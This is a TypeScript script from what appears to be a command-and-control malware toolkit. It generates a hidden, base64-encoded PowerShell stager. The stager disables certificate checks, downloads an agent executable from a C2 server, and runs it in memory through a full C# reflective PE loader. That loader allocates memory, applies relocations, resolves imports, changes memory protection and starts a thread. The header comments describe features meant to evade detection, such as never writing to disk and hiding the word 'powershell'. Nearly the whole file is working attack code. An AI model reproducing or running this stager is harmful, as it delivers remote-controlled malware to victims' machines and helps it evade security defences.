#!/usr/bin/env bun
/**
 * gen-stager.ts — Generate a PowerShell one-liner stager
 *
 * Usage:
 *   bun run scripts/gen-stager.ts <c2-base-url> <agent-filename>
 *
 * Example:
 *   bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe
 *
 * Output:
 *   powershell -nop -w h -ep b -enc <base64>
 *
 * The encoded payload downloads the agent from the C2 download endpoint and
 * executes it entirely in memory via a C# reflective PE loader compiled at
 * runtime with Add-Type. No EXE is written to disk. "powershell" never appears
 * literally in the one-liner — the cmd.exe launcher calls the binary directly.
 */

const [, , c2url, agentFile] = process.argv;

if (!c2url || !agentFile) {
  console.error("Usage: bun run scripts/gen-stager.ts <c2-base-url> <agent-filename>");
  console.error("  e.g. bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe");
  process.exit(1);
}

const downloadUrl = `${c2url.replace(/\/$/, "")}/api/build/download/${agentFile}`;

// ── C# reflective PE loader (same as Crypter/src/crypter.ts buildPeLoaderCs) ──
const peLoaderCs = [
  "using System;",
  "using System.Runtime.InteropServices;",
  "public class L{",
  '[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);',
  '[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);',
  '[DllImport("kernel32")]static extern IntPtr LoadLibraryA(string n);',
  '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);',
  '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,IntPtr n);',
  '[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);',
  "public static void Run(byte[] pe){",
  "int lfa=BitConverter.ToInt32(pe,0x3c);",
  "bool x6=BitConverter.ToUInt16(pe,lfa+4)==0x8664;",
  "int opt=lfa+24;",
  "uint isz=BitConverter.ToUInt32(pe,opt+56);",
  "uint hsz=BitConverter.ToUInt32(pe,opt+60);",
  "IntPtr img=VirtualAlloc(IntPtr.Zero,isz,0x3000,0x04);",
  "if(img==IntPtr.Zero)return;",
  "Marshal.Copy(pe,0,img,(int)hsz);",
  "int ns=BitConverter.ToUInt16(pe,lfa+6);",
  "int os2=BitConverter.ToUInt16(pe,lfa+20);",
  "int so=lfa+24+os2;",
  "for(int i=0;i<ns;i++){",
  "int s=so+i*40;",
  "uint va=BitConverter.ToUInt32(pe,s+12);",
  "uint rs=BitConverter.ToUInt32(pe,s+16);",
  "uint ro=BitConverter.ToUInt32(pe,s+20);",
  "if(rs>0)Marshal.Copy(pe,(int)ro,new IntPtr(img.ToInt64()+(long)va),(int)rs);}",
  "long pb=x6?BitConverter.ToInt64(pe,opt+24):(long)BitConverter.ToUInt32(pe,opt+28);",
  "long dl=img.ToInt64()-pb;",
  "uint rr=BitConverter.ToUInt32(pe,opt+(x6?152:136));",
  "uint rz=BitConverter.ToUInt32(pe,opt+(x6?156:140));",
  "if(dl!=0&&rr!=0){",
  "long rb=img.ToInt64()+(long)rr;",
  "int roff=0;",
  "while(roff<(int)rz){",
  "uint pg=(uint)Marshal.ReadInt32(new IntPtr(rb+roff));",
  "uint bk=(uint)Marshal.ReadInt32(new IntPtr(rb+roff+4));",
  "if(bk<8)break;",
  "int ct=(int)(bk-8)/2;",
  "for(int j=0;j<ct;j++){",
  "ushort en=(ushort)Marshal.ReadInt16(new IntPtr(rb+roff+8+j*2));",
  "int tp=en>>12;int of=en&0xFFF;",
  "IntPtr sl=new IntPtr(img.ToInt64()+(long)pg+of);",
  "if(tp==3){Marshal.WriteInt32(sl,(int)(Marshal.ReadInt32(sl)+(int)dl));}",
  "else if(tp==10){Marshal.WriteInt64(sl,Marshal.ReadInt64(sl)+dl);}}",
  "roff+=(int)bk;}}",
  "uint ir=BitConverter.ToUInt32(pe,opt+(x6?120:104));",
  "if(ir!=0){",
  "long ib=img.ToInt64();",
  "int ioff=(int)ir;",
  "while(true){",
  "uint olt=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff));",
  "uint nr=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+12));",
  "uint it=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+16));",
  "if(nr==0)break;",
  "string dn=Marshal.PtrToStringAnsi(new IntPtr(ib+(long)nr));",
  "IntPtr md=LoadLibraryA(dn);",
  "int th=(int)(olt!=0?olt:it);int ia=(int)it;",
  "while(true){",
  "long vl=x6?Marshal.ReadInt64(new IntPtr(ib+th)):(long)Marshal.ReadInt32(new IntPtr(ib+th));",
  "if(vl==0)break;",
  "bool od=x6?(vl&unchecked((long)0x8000000000000000L))!=0:(vl&0x80000000L)!=0;",
  "IntPtr pc=od?GetProcAddress(md,new IntPtr((int)(vl&0xFFFF))):GetProcAddress(md,Marshal.PtrToStringAnsi(new IntPtr(ib+(int)(vl&0x7FFFFFFFL)+2)));",
  "if(x6)Marshal.WriteInt64(new IntPtr(ib+ia),pc.ToInt64());",
  "else Marshal.WriteInt32(new IntPtr(ib+ia),(int)pc.ToInt32());",
  "th+=x6?8:4;ia+=x6?8:4;}",
  "ioff+=20;}}",
  "uint dm;VirtualProtect(img,isz,0x20,out dm);",
  "uint ep=BitConverter.ToUInt32(pe,opt+16);",
  "CreateThread(IntPtr.Zero,0,new IntPtr(img.ToInt64()+(long)ep),IntPtr.Zero,0,IntPtr.Zero);",
  "System.Threading.Thread.Sleep(10000);}}",
].join("");

const csB64 = Buffer.from(peLoaderCs, "utf-8").toString("base64");

// ── PS script: download payload + reflective load ─────────────────────────────
// Written as a multi-statement one-liner, then base64-encoded for -enc flag
const psScript = [
  // Disable cert validation (handles self-signed C2 certs)
  `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
  `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
  `$b=(New-Object Net.WebClient).DownloadData('${downloadUrl}')`,
  `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
  `[L]::Run($b)`,
].join(";");

// PowerShell -enc expects UTF-16LE base64
const enc = Buffer.from(psScript, "utf16le").toString("base64");

const oneLiner = `powershell -nop -w h -ep b -enc ${enc}`;

console.log("\n─────────────────────────────────────────────────────────────────");
console.log(" PS One-Liner Stager");
console.log(`  C2: ${c2url}`);
console.log(`  Agent: ${agentFile}`);
console.log("─────────────────────────────────────────────────────────────────\n");
console.log(oneLiner);
console.log("\n─────────────────────────────────────────────────────────────────");
console.log(` Length: ${oneLiner.length} chars`);
console.log("─────────────────────────────────────────────────────────────────\n");
